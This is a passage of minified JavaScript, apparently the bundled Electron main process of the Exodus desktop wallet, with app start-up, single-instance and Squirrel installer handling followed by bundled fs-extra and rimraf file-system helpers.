        console.log("received window:fetchIsFocused request");
        const e = p.appWindows.background.isFocused();
        p.appWindows.ui.webContents.send("window:isFocused", { isFocused: e });
      });
    const D = h.isExistsSync();
    (y.debug || process.env.DEBUG_MODE || c.ENV_DEV || D) && (console.log("DEBUG MODE"), (globalThis.DEBUG_MODE = y.debug || process.env.DEBUG_MODE || !0));
    let k = !1;
    o.app.on("window-all-closed", function () {
      k && o.app.quit();
    }),
      process.on("uncaughtException", function (e) {
        console.error("Uncaught Exception", (e && e.message) || e), e && e.stack && console.error("Stacktrace", e.stack);
      }),
      process.on("unhandledRejection", function (e, t) {
        console.error(`Unhandled rejection: ${(e && e.stack) || e}`);
      });
    let _ = !1;
    const N = () => {
      _ || (o.app.quit(), (_ = !0));
    };
    ["SIGINT", "SIGTERM", "SIGQUIT", "beforeExit"].forEach((e) => process.once(e, N)),
      o.Menu.setApplicationMenu(null),
      a.rpcMain.once("app:showDevMenu", () => {
        o.Menu.setApplicationMenu(f.default);
      }),
      a.rpcMain.on("app:showPopupMenu", (e, t) => {
        o.Menu.buildFromTemplate(t).popup(o.BrowserWindow.getFocusedWindow());
      }),
      o.app.on("ready", async () => {
        l.a.instantEvent("appReady");
        const e = o.app.requestSingleInstanceLock();
        if (
          (o.app.on("second-instance", function (e, t, n) {
            const o = p.appWindows.background;
            o.isMinimized() && o.restore(), o.focus(), O(t.find((e) => E(e))), Object(m.maybeDeepLink)(t.find((e) => Object(m.isDeepLink)(e)));
          }),
          !e)
        )
          return (
            console.error("Another instance of Exodus is already running. Please close it and try again."),
            void (globalThis.OPENED_URL && -1 !== globalThis.OPENED_URL.indexOf("recover")
              ? setTimeout(() => {
                  o.dialog.showMessageBoxSync({ title: "Wallet restore", message: "Please close opened Exodus and try again.", buttons: ["OK"] }), o.app.quit();
                }, 2e3)
              : setTimeout(o.app.quit.bind(o.app), 1e3))
          );
        const t = o.app.getPath("userData");
        console.log(`Exodus (production): DATA DIR: ${t}`), Object(a.mainBroadcastListener)();
        try {
          Object(p.onAppReady)(y);
        } catch (e) {
          console.error(e);
        }
        (k = !0),
          setImmediate(() => {
            try {
              if ("linux" === process.platform) {
                const e = p.appWindows.background.webContents.getOwnerBrowserWindow(),
                  [t, n] = e.getSize();
                e.setSize(t + 1, n + 1), e.setSize(t - 1, n - 1);
              }
            } catch (e) {
              console.log("Automatic resize failed — Do a manual window resize to fix black screen.", e.message);
            }
            if ("darwin" === process.platform) o.Menu.setApplicationMenu(f.default);
            else {
              const e = () => {
                  o.Menu.setApplicationMenu(f.default);
                  const { height: e, width: t } = Object(b.default)(p.appWindows.background);
                  p.appWindows.ui.setBounds({ x: 0, y: 0, width: t, height: e });
                },
                t = { control: !0, shift: !0, key: "d", code: "KeyD" };
              for (const n of [p.appWindows.background, p.appWindows.ui]) Object(w.registerShortcut)(n, t, e);
            }
          });
      });
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "handleCommand", function () {
        return l;
      });
    var o = n(52),
      r = n(0),
      i = n(2),
      s = n.n(i),
      c = n(1),
      a = n(46);
    function u(e, t) {
      const n = s.a.resolve(s.a.dirname(process.execPath), "..", "Update.exe");
      Object(o.spawn)(n, e, { detached: !0 }).on("close", t);
    }
    function l(e) {
      const t = s.a.basename(process.execPath);
      if ("--squirrel-install" === e || "--squirrel-updated" === e)
        return (
          u([`--createShortcut=${t}`], () => {
            Object(a.setDefaultProtocols)(), setTimeout(() => r.app.quit(), 3e3);
          }),
          !0
        );
      if ("--squirrel-uninstall" === e) return Object(a.removeDefaultProtocols)(), u([`--removeShortcut=${t}`], r.app.quit.bind(r.app)), !0;
      if ("--squirrel-obsolete" === e) return r.app.quit(), !0;
      if ("--squirrel-firstrun" === e) {
        const e = (() => (c.ENV_BUILD_EXODUS ? "Exodus" : c.ENV_BUILD_EDEN ? "ExodusEden" : c.ENV_BUILD_NAME))(),
          t = { type: "info", buttons: ["OK"], title: `${e} Installed`, message: `${e} has been installed! You can run it by clicking the shortcut on your desktop or in the app menu.`, noLink: !1 };
        return (
          r.app.on("ready", () => {
            r.dialog.showMessageBoxSync(null, t), r.app.quit();
          }),
          !0
        );
      }
      return !1;
    }
  },
  function (e, t, n) {
    "use strict";
    n.r(t);
    var o = n(46);
    (() => {
      if ("win32" === process.platform) {
        return !n(98).handleCommand(process.argv[1]);
      }
      return Object(o.setDefaultProtocols)(), !0;
    })() && n(97);
  },
  function (e, t, n) {
    "use strict";
    n.r(t),
      n.d(t, "dataDir", function () {
        return r;
      }),
      n.d(t, "desktopDir", function () {
        return i;
      });
    var o = n(0);
    function r() {
      return o.app.getPath("userData");
    }
    function i() {
      return o.app.getPath("desktop");
    }
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(2),
      i = n(58).copySync,
      s = n(47).removeSync,
      c = n(21).mkdirpSync,
      a = n(38);
    function u(e, t, n) {
      try {
        o.renameSync(e, t);
      } catch (o) {
        if ("EXDEV" !== o.code) throw o;
        return (function (e, t, n) {
          return i(e, t, { overwrite: n, errorOnExist: !0 }), s(e);
        })(e, t, n);
      }
    }
    e.exports = function (e, t, n) {
      const i = (n = n || {}).overwrite || n.clobber || !1,
        { srcStat: l, isChangingCase: d = !1 } = a.checkPathsSync(e, t, "move", n);
      return (
        a.checkParentPathsSync(e, l, t, "move"),
        (function (e) {
          const t = r.dirname(e);
          return r.parse(t).root === t;
        })(t) || c(r.dirname(t)),
        (function (e, t, n, r) {
          if (r) return u(e, t, n);
          if (n) return s(t), u(e, t, n);
          if (o.existsSync(t)) throw new Error("dest already exists.");
          return u(e, t, n);
        })(e, t, i, d)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(2),
      i = n(58).copy,
      s = n(47).remove,
      c = n(21).mkdirp,
      a = n(31).pathExists,
      u = n(38);
    function l(e, t, n, o, r) {
      return o ? d(e, t, n, r) : n ? s(t, (o) => (o ? r(o) : d(e, t, n, r))) : void a(t, (o, i) => (o ? r(o) : i ? r(new Error("dest already exists.")) : d(e, t, n, r)));
    }
    function d(e, t, n, r) {
      o.rename(e, t, (o) =>
        o
          ? "EXDEV" !== o.code
            ? r(o)
            : (function (e, t, n, o) {
                i(e, t, { overwrite: n, errorOnExist: !0 }, (t) => (t ? o(t) : s(e, o)));
              })(e, t, n, r)
          : r()
      );
    }
    e.exports = function (e, t, n, o) {
      "function" == typeof n && ((o = n), (n = {}));
      const i = (n = n || {}).overwrite || n.clobber || !1;
      u.checkPaths(e, t, "move", n, (n, s) => {
        if (n) return o(n);
        const { srcStat: a, isChangingCase: d = !1 } = s;
        u.checkParentPaths(e, a, t, "move", (n) =>
          n
            ? o(n)
            : (function (e) {
                const t = r.dirname(e);
                return r.parse(t).root === t;
              })(t)
            ? l(e, t, i, d, o)
            : void c(r.dirname(t), (n) => (n ? o(n) : l(e, t, i, d, o)))
        );
      });
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback;
    e.exports = { move: o(n(102)), moveSync: n(101) };
  },
  function (e, t, n) {
    "use strict";
    const { stringify: o } = n(57),
      { outputFileSync: r } = n(56);
    e.exports = function (e, t, n) {
      const i = o(t, n);
      r(e, i, n);
    };
  },
  function (e, t, n) {
    "use strict";
    const { stringify: o } = n(57),
      { outputFile: r } = n(56);
    e.exports = async function (e, t, n = {}) {
      const i = o(t, n);
      await r(e, i, n);
    };
  },
  function (e, t, n) {
    "use strict";
    (t.fromCallback = function (e) {
      return Object.defineProperty(
        function (...t) {
          if ("function" != typeof t[t.length - 1])
            return new Promise((n, o) => {
              e.call(this, ...t, (e, t) => (null != e ? o(e) : n(t)));
            });
          e.apply(this, t);
        },
        "name",
        { value: e.name }
      );
    }),
      (t.fromPromise = function (e) {
        return Object.defineProperty(
          function (...t) {
            const n = t[t.length - 1];
            if ("function" != typeof n) return e.apply(this, t);
            e.apply(this, t.slice(0, -1)).then((e) => n(null, e), n);
          },
          "name",
          { value: e.name }
        );
      });
  },
  function (e, t, n) {
    let o;
    try {
      o = n(12);
    } catch (e) {
      o = n(24);
    }
    const r = n(106),
      { stringify: i, stripBom: s } = n(57);
    const c = {
      readFile: r.fromPromise(async function (e, t = {}) {
        "string" == typeof t && (t = { encoding: t });
        const n = t.fs || o,
          i = !("throws" in t) || t.throws;
        let c,
          a = await r.fromCallback(n.readFile)(e, t);
        a = s(a);
        try {
          c = JSON.parse(a, t ? t.reviver : null);
        } catch (t) {
          if (i) throw ((t.message = `${e}: ${t.message}`), t);
          return null;
        }
        return c;
      }),
      readFileSync: function (e, t = {}) {
        "string" == typeof t && (t = { encoding: t });
        const n = t.fs || o,
          r = !("throws" in t) || t.throws;
        try {
          let o = n.readFileSync(e, t);
          return (o = s(o)), JSON.parse(o, t.reviver);
        } catch (t) {
          if (r) throw ((t.message = `${e}: ${t.message}`), t);
          return null;
        }
      },
      writeFile: r.fromPromise(async function (e, t, n = {}) {
        const s = n.fs || o,
          c = i(t, n);
        await r.fromCallback(s.writeFile)(e, c, n);
      }),
      writeFileSync: function (e, t, n = {}) {
        const r = n.fs || o,
          s = i(t, n);
        return r.writeFileSync(e, s, n);
      },
    };
    e.exports = c;
  },
  function (e, t, n) {
    "use strict";
    const o = n(107);
    e.exports = { readJson: o.readFile, readJsonSync: o.readFileSync, writeJson: o.writeFile, writeJsonSync: o.writeFileSync };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromPromise,
      r = n(108);
    (r.outputJson = o(n(105))),
      (r.outputJsonSync = n(104)),
      (r.outputJSON = r.outputJson),
      (r.outputJSONSync = r.outputJsonSync),
      (r.writeJSON = r.writeJson),
      (r.writeJSONSync = r.writeJsonSync),
      (r.readJSON = r.readJson),
      (r.readJSONSync = r.readJsonSync),
      (e.exports = r);
  },
  function (e, t, n) {
    "use strict";
    const o = n(12);
    e.exports = {
      symlinkType: function (e, t, n) {
        if (((n = "function" == typeof t ? t : n), (t = "function" != typeof t && t))) return n(null, t);
        o.lstat(e, (e, o) => {
          if (e) return n(null, "file");
          (t = o && o.isDirectory() ? "dir" : "file"), n(null, t);
        });
      },
      symlinkTypeSync: function (e, t) {
        let n;
        if (t) return t;
        try {
          n = o.lstatSync(e);
        } catch {
          return "file";
        }
        return n && n.isDirectory() ? "dir" : "file";
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(2),
      r = n(12),
      i = n(31).pathExists;
    e.exports = {
      symlinkPaths: function (e, t, n) {
        if (o.isAbsolute(e)) return r.lstat(e, (t) => (t ? ((t.message = t.message.replace("lstat", "ensureSymlink")), n(t)) : n(null, { toCwd: e, toDst: e })));
        {
          const s = o.dirname(t),
            c = o.join(s, e);
          return i(c, (t, i) =>
            t ? n(t) : i ? n(null, { toCwd: c, toDst: e }) : r.lstat(e, (t) => (t ? ((t.message = t.message.replace("lstat", "ensureSymlink")), n(t)) : n(null, { toCwd: e, toDst: o.relative(s, e) })))
          );
        }
      },
      symlinkPathsSync: function (e, t) {
        let n;
        if (o.isAbsolute(e)) {
          if (!(n = r.existsSync(e))) throw new Error("absolute srcpath does not exist");
          return { toCwd: e, toDst: e };
        }
        {
          const i = o.dirname(t),
            s = o.join(i, e);
          if ((n = r.existsSync(s))) return { toCwd: s, toDst: e };
          if (!(n = r.existsSync(e))) throw new Error("relative srcpath does not exist");
          return { toCwd: e, toDst: o.relative(i, e) };
        }
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback,
      r = n(2),
      i = n(39),
      s = n(21),
      c = s.mkdirs,
      a = s.mkdirsSync,
      u = n(111),
      l = u.symlinkPaths,
      d = u.symlinkPathsSync,
      f = n(110),
      p = f.symlinkType,
      h = f.symlinkTypeSync,
      w = n(31).pathExists,
      { areIdentical: m } = n(38);
    function b(e, t, n, o) {
      l(e, t, (s, a) => {
        if (s) return o(s);
        (e = a.toDst),
          p(a.toCwd, n, (n, s) => {
            if (n) return o(n);
            const a = r.dirname(t);
            w(a, (n, r) =>
              n
                ? o(n)
                : r
                ? i.symlink(e, t, s, o)
                : void c(a, (n) => {
                    if (n) return o(n);
                    i.symlink(e, t, s, o);
                  })
            );
          });
      });
    }
    e.exports = {
      createSymlink: o(function (e, t, n, o) {
        (o = "function" == typeof n ? n : o),
          (n = "function" != typeof n && n),
          i.lstat(t, (r, s) => {
            !r && s.isSymbolicLink()
              ? Promise.all([i.stat(e), i.stat(t)]).then(([r, i]) => {
                  if (m(r, i)) return o(null);
                  b(e, t, n, o);
                })
              : b(e, t, n, o);
          });
      }),
      createSymlinkSync: function (e, t, n) {
        let o;
        try {
          o = i.lstatSync(t);
        } catch {}
        if (o && o.isSymbolicLink()) {
          const n = i.statSync(e),
            o = i.statSync(t);
          if (m(n, o)) return;
        }
        const s = d(e, t);
        (e = s.toDst), (n = h(s.toCwd, n));
        const c = r.dirname(t);
        return i.existsSync(c) ? i.symlinkSync(e, t, n) : (a(c), i.symlinkSync(e, t, n));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback,
      r = n(2),
      i = n(12),
      s = n(21),
      c = n(31).pathExists,
      { areIdentical: a } = n(38);
    e.exports = {
      createLink: o(function (e, t, n) {
        function o(e, t) {
          i.link(e, t, (e) => {
            if (e) return n(e);
            n(null);
          });
        }
        i.lstat(t, (u, l) => {
          i.lstat(e, (i, u) => {
            if (i) return (i.message = i.message.replace("lstat", "ensureLink")), n(i);
            if (l && a(u, l)) return n(null);
            const d = r.dirname(t);
            c(d, (r, i) =>
              r
                ? n(r)
                : i
                ? o(e, t)
                : void s.mkdirs(d, (r) => {
                    if (r) return n(r);
                    o(e, t);
                  })
            );
          });
        });
      }),
      createLinkSync: function (e, t) {
        let n;
        try {
          n = i.lstatSync(t);
        } catch {}
        try {
          const t = i.lstatSync(e);
          if (n && a(t, n)) return;
        } catch (e) {
          throw ((e.message = e.message.replace("lstat", "ensureLink")), e);
        }
        const o = r.dirname(t);
        return i.existsSync(o) ? i.linkSync(e, t) : (s.mkdirsSync(o), i.linkSync(e, t));
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback,
      r = n(2),
      i = n(12),
      s = n(21);
    e.exports = {
      createFile: o(function (e, t) {
        function n() {
          i.writeFile(e, "", (e) => {
            if (e) return t(e);
            t();
          });
        }
        i.stat(e, (o, c) => {
          if (!o && c.isFile()) return t();
          const a = r.dirname(e);
          i.stat(a, (e, o) => {
            if (e)
              return "ENOENT" === e.code
                ? s.mkdirs(a, (e) => {
                    if (e) return t(e);
                    n();
                  })
                : t(e);
            o.isDirectory()
              ? n()
              : i.readdir(a, (e) => {
                  if (e) return t(e);
                });
          });
        });
      }),
      createFileSync: function (e) {
        let t;
        try {
          t = i.statSync(e);
        } catch {}
        if (t && t.isFile()) return;
        const n = r.dirname(e);
        try {
          i.statSync(n).isDirectory() || i.readdirSync(n);
        } catch (e) {
          if (!e || "ENOENT" !== e.code) throw e;
          s.mkdirsSync(n);
        }
        i.writeFileSync(e, "");
      },
    };
  },
  function (e, t, n) {
    "use strict";
    const { createFile: o, createFileSync: r } = n(114),
      { createLink: i, createLinkSync: s } = n(113),
      { createSymlink: c, createSymlinkSync: a } = n(112);
    e.exports = {
      createFile: o,
      createFileSync: r,
      ensureFile: o,
      ensureFileSync: r,
      createLink: i,
      createLinkSync: s,
      ensureLink: i,
      ensureLinkSync: s,
      createSymlink: c,
      createSymlinkSync: a,
      ensureSymlink: c,
      ensureSymlinkSync: a,
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(2),
      i = n(68),
      s = "win32" === process.platform;
    function c(e) {
      ["unlink", "chmod", "stat", "lstat", "rmdir", "readdir"].forEach((t) => {
        (e[t] = e[t] || o[t]), (e[(t += "Sync")] = e[t] || o[t]);
      }),
        (e.maxBusyTries = e.maxBusyTries || 3);
    }
    function a(e, t, n) {
      let o = 0;
      "function" == typeof t && ((n = t), (t = {})),
        i(e, "rimraf: missing path"),
        i.strictEqual(typeof e, "string", "rimraf: path should be a string"),
        i.strictEqual(typeof n, "function", "rimraf: callback function required"),
        i(t, "rimraf: invalid options argument provided"),
        i.strictEqual(typeof t, "object", "rimraf: options should be object"),
        c(t),
        u(e, t, function r(i) {
          if (i) {
            if (("EBUSY" === i.code || "ENOTEMPTY" === i.code || "EPERM" === i.code) && o < t.maxBusyTries) {
              return o++, setTimeout(() => u(e, t, r), 100 * o);
            }
            "ENOENT" === i.code && (i = null);
          }
          n(i);
        });
    }
    function u(e, t, n) {
      i(e),
        i(t),
        i("function" == typeof n),
        t.lstat(e, (o, r) =>
          o && "ENOENT" === o.code
            ? n(null)
            : o && "EPERM" === o.code && s
            ? l(e, t, o, n)
            : r && r.isDirectory()
            ? f(e, t, o, n)
            : void t.unlink(e, (o) => {
                if (o) {
                  if ("ENOENT" === o.code) return n(null);
                  if ("EPERM" === o.code) return s ? l(e, t, o, n) : f(e, t, o, n);
                  if ("EISDIR" === o.code) return f(e, t, o, n);
                }
                return n(o);
              })
        );
    }
    function l(e, t, n, o) {
      i(e),
        i(t),
        i("function" == typeof o),
        t.chmod(e, 438, (r) => {
          r
            ? o("ENOENT" === r.code ? null : n)
            : t.stat(e, (r, i) => {
                r ? o("ENOENT" === r.code ? null : n) : i.isDirectory() ? f(e, t, n, o) : t.unlink(e, o);
              });
        });
    }
    function d(e, t, n) {
      let o;
      i(e), i(t);
      try {
        t.chmodSync(e, 438);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      try {
        o = t.statSync(e);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw n;
      }
      o.isDirectory() ? h(e, t, n) : t.unlinkSync(e);
    }
    function f(e, t, n, o) {
      i(e),
        i(t),
        i("function" == typeof o),
        t.rmdir(e, (s) => {
          !s || ("ENOTEMPTY" !== s.code && "EEXIST" !== s.code && "EPERM" !== s.code)
            ? s && "ENOTDIR" === s.code
              ? o(n)
              : o(s)
            : (function (e, t, n) {
                i(e),
                  i(t),
                  i("function" == typeof n),
                  t.readdir(e, (o, i) => {
                    if (o) return n(o);
                    let s,
                      c = i.length;
                    if (0 === c) return t.rmdir(e, n);
                    i.forEach((o) => {
                      a(r.join(e, o), t, (o) => {
                        if (!s) return o ? n((s = o)) : void (0 == --c && t.rmdir(e, n));
                      });
                    });
                  });
              })(e, t, o);
        });
    }
    function p(e, t) {
      let n;
      c((t = t || {})),
        i(e, "rimraf: missing path"),
        i.strictEqual(typeof e, "string", "rimraf: path should be a string"),
        i(t, "rimraf: missing options"),
        i.strictEqual(typeof t, "object", "rimraf: options should be object");
      try {
        n = t.lstatSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        "EPERM" === n.code && s && d(e, t, n);
      }
      try {
        n && n.isDirectory() ? h(e, t, null) : t.unlinkSync(e);
      } catch (n) {
        if ("ENOENT" === n.code) return;
        if ("EPERM" === n.code) return s ? d(e, t, n) : h(e, t, n);
        if ("EISDIR" !== n.code) throw n;
        h(e, t, n);
      }
    }
    function h(e, t, n) {
      i(e), i(t);
      try {
        t.rmdirSync(e);
      } catch (o) {
        if ("ENOTDIR" === o.code) throw n;
        if ("ENOTEMPTY" === o.code || "EEXIST" === o.code || "EPERM" === o.code)
          !(function (e, t) {
            if ((i(e), i(t), t.readdirSync(e).forEach((n) => p(r.join(e, n), t)), !s)) {
              const n = t.rmdirSync(e, t);
              return n;
            }
            {
              const n = Date.now();
              do {
                try {
                  const n = t.rmdirSync(e, t);
                  return n;
                } catch {}
              } while (Date.now() - n < 500);
            }
          })(e, t);
        else if ("ENOENT" !== o.code) throw o;
      }
    }
    (e.exports = a), (a.sync = p);
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromPromise,
      r = n(39),
      i = n(2),
      s = n(21),
      c = n(47),
      a = o(async function (e) {
        let t;
        try {
          t = await r.readdir(e);
        } catch {
          return s.mkdirs(e);
        }
        return Promise.all(t.map((t) => c.remove(i.join(e, t))));
      });
    function u(e) {
      let t;
      try {
        t = r.readdirSync(e);
      } catch {
        return s.mkdirsSync(e);
      }
      t.forEach((t) => {
        (t = i.join(e, t)), c.removeSync(t);
      });
    }
    e.exports = { emptyDirSync: u, emptydirSync: u, emptyDir: a, emptydir: a };
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(2),
      i = n(21).mkdirsSync,
      s = n(67).utimesMillisSync,
      c = n(38);
    function a(e, t, n, i) {
      const s = (i.dereference ? o.statSync : o.lstatSync)(t);
      if (s.isDirectory())
        return (function (e, t, n, r, i) {
          return t
            ? d(n, r, i)
            : (function (e, t, n, r) {
                return o.mkdirSync(n), d(t, n, r), l(n, e);
              })(e.mode, n, r, i);
        })(s, e, t, n, i);
      if (s.isFile() || s.isCharacterDevice() || s.isBlockDevice())
        return (function (e, t, n, r, i) {
          return t
            ? (function (e, t, n, r) {
                if (r.overwrite) return o.unlinkSync(n), u(e, t, n, r);
                if (r.errorOnExist) throw new Error(`'${n}' already exists`);
              })(e, n, r, i)
            : u(e, n, r, i);
        })(s, e, t, n, i);
      if (s.isSymbolicLink())
        return (function (e, t, n, i) {
          let s = o.readlinkSync(t);
          i.dereference && (s = r.resolve(process.cwd(), s));
          if (e) {
            let e;
            try {
              e = o.readlinkSync(n);
            } catch (e) {
              if ("EINVAL" === e.code || "UNKNOWN" === e.code) return o.symlinkSync(s, n);
              throw e;
            }
            if ((i.dereference && (e = r.resolve(process.cwd(), e)), c.isSrcSubdir(s, e))) throw new Error(`Cannot copy '${s}' to a subdirectory of itself, '${e}'.`);
            if (o.statSync(n).isDirectory() && c.isSrcSubdir(e, s)) throw new Error(`Cannot overwrite '${e}' with '${s}'.`);
            return (function (e, t) {
              return o.unlinkSync(t), o.symlinkSync(e, t);
            })(s, n);
          }
          return o.symlinkSync(s, n);
        })(e, t, n, i);
      if (s.isSocket()) throw new Error(`Cannot copy a socket file: ${t}`);
      if (s.isFIFO()) throw new Error(`Cannot copy a FIFO pipe: ${t}`);
      throw new Error(`Unknown file: ${t}`);
    }
    function u(e, t, n, r) {
      return (
        o.copyFileSync(t, n),
        r.preserveTimestamps &&
          (function (e, t, n) {
            (function (e) {
              return 0 == (128 & e);
            })(e) &&
              (function (e, t) {
                l(e, 128 | t);
              })(n, e);
            (function (e, t) {
              const n = o.statSync(e);
              s(t, n.atime, n.mtime);
            })(t, n);
          })(e.mode, t, n),
        l(n, e.mode)
      );
    }
    function l(e, t) {
      return o.chmodSync(e, t);
    }
    function d(e, t, n) {
      o.readdirSync(e).forEach((o) =>
        (function (e, t, n, o) {
          const i = r.join(t, e),
            s = r.join(n, e),
            { destStat: u } = c.checkPathsSync(i, s, "copy", o);
          return (function (e, t, n, o) {
            if (!o.filter || o.filter(t, n)) return a(e, t, n, o);
          })(u, i, s, o);
        })(o, e, t, n)
      );
    }
    e.exports = function (e, t, n) {
      "function" == typeof n && (n = { filter: n }),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          process.emitWarning(
            "Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269",
            "Warning",
            "fs-extra-WARN0002"
          );
      const { srcStat: s, destStat: u } = c.checkPathsSync(e, t, "copy", n);
      return (
        c.checkParentPathsSync(e, s, t, "copy"),
        (function (e, t, n, s) {
          if (s.filter && !s.filter(t, n)) return;
          const c = r.dirname(n);
          return o.existsSync(c) || i(c), a(e, t, n, s);
        })(u, e, t, n)
      );
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(2);
    e.exports.checkPath = function (e) {
      if ("win32" === process.platform) {
        if (/[<>:"|?*]/.test(e.replace(o.parse(e).root, ""))) {
          const t = new Error(`Path contains invalid characters: ${e}`);
          throw ((t.code = "EINVAL"), t);
        }
      }
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(39),
      { checkPath: r } = n(119),
      i = (e) => {
        return "number" == typeof e ? e : { ...{ mode: 511 }, ...e }.mode;
      };
    (e.exports.makeDir = async (e, t) => (r(e), o.mkdir(e, { mode: i(t), recursive: !0 }))), (e.exports.makeDirSync = (e, t) => (r(e), o.mkdirSync(e, { mode: i(t), recursive: !0 })));
  },
  function (e, t, n) {
    "use strict";
    const o = n(12),
      r = n(2),
      i = n(21).mkdirs,
      s = n(31).pathExists,
      c = n(67).utimesMillis,
      a = n(38);
    function u(e, t, n, o, c) {
      const a = r.dirname(n);
      s(a, (r, s) => (r ? c(r) : s ? d(e, t, n, o, c) : void i(a, (r) => (r ? c(r) : d(e, t, n, o, c)))));
    }
    function l(e, t, n, o, r, i) {
      Promise.resolve(r.filter(n, o)).then(
        (s) => (s ? e(t, n, o, r, i) : i()),
        (e) => i(e)
      );
    }
    function d(e, t, n, r, i) {
      (r.dereference ? o.stat : o.lstat)(t, (s, c) =>
        s
          ? i(s)
          : c.isDirectory()
          ? (function (e, t, n, r, i, s) {
              return t
                ? w(n, r, i, s)
                : (function (e, t, n, r, i) {
                    o.mkdir(n, (o) => {
                      if (o) return i(o);
                      w(t, n, r, (t) => (t ? i(t) : h(n, e, i)));
                    });
                  })(e.mode, n, r, i, s);
            })(c, e, t, n, r, i)
          : c.isFile() || c.isCharacterDevice() || c.isBlockDevice()
          ? (function (e, t, n, r, i, s) {
              return t
                ? (function (e, t, n, r, i) {
                    if (!r.overwrite) return r.errorOnExist ? i(new Error(`'${n}' already exists`)) : i();
                    o.unlink(n, (o) => (o ? i(o) : f(e, t, n, r, i)));
                  })(e, n, r, i, s)
                : f(e, n, r, i, s);
            })(c, e, t, n, r, i)
          : c.isSymbolicLink()
          ? b(e, t, n, r, i)
          : c.isSocket()
          ? i(new Error(`Cannot copy a socket file: ${t}`))
          : c.isFIFO()
          ? i(new Error(`Cannot copy a FIFO pipe: ${t}`))
          : i(new Error(`Unknown file: ${t}`))
      );
    }
    function f(e, t, n, r, i) {
      o.copyFile(t, n, (o) =>
        o
          ? i(o)
          : r.preserveTimestamps
          ? (function (e, t, n, o) {
              if (
                (function (e) {
                  return 0 == (128 & e);
                })(e)
              )
                return (function (e, t, n) {
                  return h(e, 128 | t, n);
                })(n, e, (r) => (r ? o(r) : p(e, t, n, o)));
              return p(e, t, n, o);
            })(e.mode, t, n, i)
          : h(n, e.mode, i)
      );
    }
    function p(e, t, n, r) {
      !(function (e, t, n) {
        o.stat(e, (e, o) => (e ? n(e) : c(t, o.atime, o.mtime, n)));
      })(t, n, (t) => (t ? r(t) : h(n, e, r)));
    }
    function h(e, t, n) {
      return o.chmod(e, t, n);
    }
    function w(e, t, n, r) {
      o.readdir(e, (o, i) => (o ? r(o) : m(i, e, t, n, r)));
    }
    function m(e, t, n, o, i) {
      const s = e.pop();
      return s
        ? (function (e, t, n, o, i, s) {
            const c = r.join(n, t),
              u = r.join(o, t);
            a.checkPaths(c, u, "copy", i, (t, r) => {
              if (t) return s(t);
              const { destStat: a } = r;
              !(function (e, t, n, o, r) {
                o.filter ? l(d, e, t, n, o, r) : d(e, t, n, o, r);
              })(a, c, u, i, (t) => (t ? s(t) : m(e, n, o, i, s)));
            });
          })(e, s, t, n, o, i)
        : i();
    }
    function b(e, t, n, i, s) {
      o.readlink(t, (t, c) =>
        t
          ? s(t)
          : (i.dereference && (c = r.resolve(process.cwd(), c)),
            e
              ? void o.readlink(n, (t, u) =>
                  t
                    ? "EINVAL" === t.code || "UNKNOWN" === t.code
                      ? o.symlink(c, n, s)
                      : s(t)
                    : (i.dereference && (u = r.resolve(process.cwd(), u)),
                      a.isSrcSubdir(c, u)
                        ? s(new Error(`Cannot copy '${c}' to a subdirectory of itself, '${u}'.`))
                        : e.isDirectory() && a.isSrcSubdir(u, c)
                        ? s(new Error(`Cannot overwrite '${u}' with '${c}'.`))
                        : (function (e, t, n) {
                            o.unlink(t, (r) => (r ? n(r) : o.symlink(e, t, n)));
                          })(c, n, s))
                )
              : o.symlink(c, n, s))
      );
    }
    e.exports = function (e, t, n, o) {
      "function" != typeof n || o ? "function" == typeof n && (n = { filter: n }) : ((o = n), (n = {})),
        (o = o || function () {}),
        ((n = n || {}).clobber = !("clobber" in n && !n.clobber)),
        (n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber),
        n.preserveTimestamps &&
          "ia32" === process.arch &&
          process.emitWarning(
            "Using the preserveTimestamps option in 32-bit node is not recommended;\n\n\tsee https://github.com/jprichardson/node-fs-extra/issues/269",
            "Warning",
            "fs-extra-WARN0001"
          ),
        a.checkPaths(e, t, "copy", n, (r, i) => {
          if (r) return o(r);
          const { srcStat: s, destStat: c } = i;
          a.checkParentPaths(e, s, t, "copy", (r) => (r ? o(r) : n.filter ? l(u, c, e, t, n, o) : u(c, e, t, n, o)));
        });
    };
  },
  function (e, t, n) {
    "use strict";
    e.exports = function (e) {
      if (null === e || "object" != typeof e) return e;
      if (e instanceof Object) var t = { __proto__: o(e) };
      else var t = Object.create(null);
      return (
        Object.getOwnPropertyNames(e).forEach(function (n) {
          Object.defineProperty(t, n, Object.getOwnPropertyDescriptor(e, n));
        }),
        t
      );
    };
    var o =
      Object.getPrototypeOf ||
      function (e) {
        return e.__proto__;
      };
  },
  function (e, t) {
    e.exports = require("stream");
  },
  function (e, t, n) {
    var o = n(123).Stream;
    e.exports = function (e) {
      return {
        ReadStream: function t(n, r) {
          if (!(this instanceof t)) return new t(n, r);
          o.call(this);
          var i = this;
          this.path = n;
          this.fd = null;
          this.readable = !0;
          this.paused = !1;
          this.flags = "r";
          this.mode = 438;
          this.bufferSize = 65536;
          r = r || {};
          var s = Object.keys(r);
          for (var c = 0, a = s.length; c < a; c++) {
            var u = s[c];
            this[u] = r[u];
          }
          this.encoding && this.setEncoding(this.encoding);
